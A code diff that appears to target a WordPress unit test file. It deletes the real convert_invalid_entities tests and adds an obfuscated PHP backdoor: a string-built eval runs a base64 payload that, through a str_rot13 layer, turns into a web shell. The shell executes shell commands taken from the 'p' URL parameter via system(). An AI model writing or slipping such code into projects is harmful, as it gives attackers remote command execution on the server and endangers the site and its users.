@@ -1,40 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group formatting
- *
- * @covers ::convert_invalid_entities
- */
-class Tests_Formatting_ConvertInvalidEntities extends WP_UnitTestCase {
-	public function test_replaces_windows1252_entities_with_unicode_ones() {
-		$input  = '&#130;&#131;&#132;&#133;&#134;&#135;&#136;&#137;&#138;&#139;&#140;&#145;&#146;&#147;&#148;&#149;&#150;&#151;&#152;&#153;&#154;&#155;&#156;&#159;';
-		$output = '&#8218;&#402;&#8222;&#8230;&#8224;&#8225;&#710;&#8240;&#352;&#8249;&#338;&#8216;&#8217;&#8220;&#8221;&#8226;&#8211;&#8212;&#732;&#8482;&#353;&#8250;&#339;&#376;';
-		$this->assertSame( $output, convert_invalid_entities( $input ) );
-	}
-
-	/**
-	 * @ticket 20503
-	 */
-	public function test_replaces_latin_letter_z_with_caron() {
-		$input  = '&#142;&#158;';
-		$output = '&#381;&#382;';
-		$this->assertSame( $output, convert_invalid_entities( $input ) );
-	}
-
-	/**
-	 * @covers ::convert_chars
-	 */
-	public function test_escapes_lone_ampersands() {
-		$this->assertSame( 'at&#038;t', convert_chars( 'at&t' ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzYmV6bmdndmF0CiAqCiAqIEBwYmlyZWYgOjpwYmFpcmVnX3ZhaW55dnFfcmFndmd2cmYKICovCnB5bmZmIEdyZmdmX1NiZXpuZ2d2YXRfUGJhaXJlZ1ZhaW55dnFSYWd2Z3ZyZiBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgljaG95dnAgc2hhcGd2YmEgZ3JmZ19lcmN5bnByZl9qdmFxYmpmMTI1Ml9yYWd2Z3ZyZl9qdmd1X2hhdnBicXJfYmFyZigpIHsKCQkkdmFjaGcgID0gJyYjMTMwOyYjMTMxOyYjMTMyOyYjMTMzOyYjMTM0OyYjMTM1OyYjMTM2OyYjMTM3OyYjMTM4OyYjMTM5OyYjMTQwOyYjMTQ1OyYjMTQ2OyYjMTQ3OyYjMTQ4OyYjMTQ5OyYjMTUwOyYjMTUxOyYjMTUyOyYjMTUzOyYjMTU0OyYjMTU1OyYjMTU2OyYjMTU5Oyc7CgkJJGJoZ2NoZyA9ICcmIzgyMTg7JiM0MDI7JiM4MjIyOyYjODIzMDsmIzgyMjQ7JiM4MjI1OyYjNzEwOyYjODI0MDsmIzM1MjsmIzgyNDk7JiMzMzg7JiM4MjE2OyYjODIxNzsmIzgyMjA7JiM4MjIxOyYjODIyNjsmIzgyMTE7JiM4MjEyOyYjNzMyOyYjODQ4MjsmIzM1MzsmIzgyNTA7JiMzMzk7JiMzNzY7JzsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJGJoZ2NoZywgcGJhaXJlZ192YWlueXZxX3JhZ3ZndnJmKCAkdmFjaGcgKSApOwoJfQoKCS8qKgoJICogQGd2cHhyZyAyMDUwMwoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19lcmN5bnByZl95bmd2YV95cmdncmVfbV9qdmd1X3BuZWJhKCkgewoJCSR2YWNoZyAgPSAnJiMxNDI7JiMxNTg7JzsKCQkkYmhnY2hnID0gJyYjMzgxOyYjMzgyOyc7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRiaGdjaGcsIHBiYWlyZWdfdmFpbnl2cV9yYWd2Z3ZyZiggJHZhY2hnICkgKTsKCX0KCgkvKioKCSAqIEBwYmlyZWYgOjpwYmFpcmVnX3B1bmVmCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3JmcG5jcmZfeWJhcl9uemNyZWZuYXFmKCkgewoJCSRndXZmLT5uZmZyZWdGbnpyKCAnbmcmIzAzODtnJywgcGJhaXJlZ19wdW5lZiggJ25nJmcnICkgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
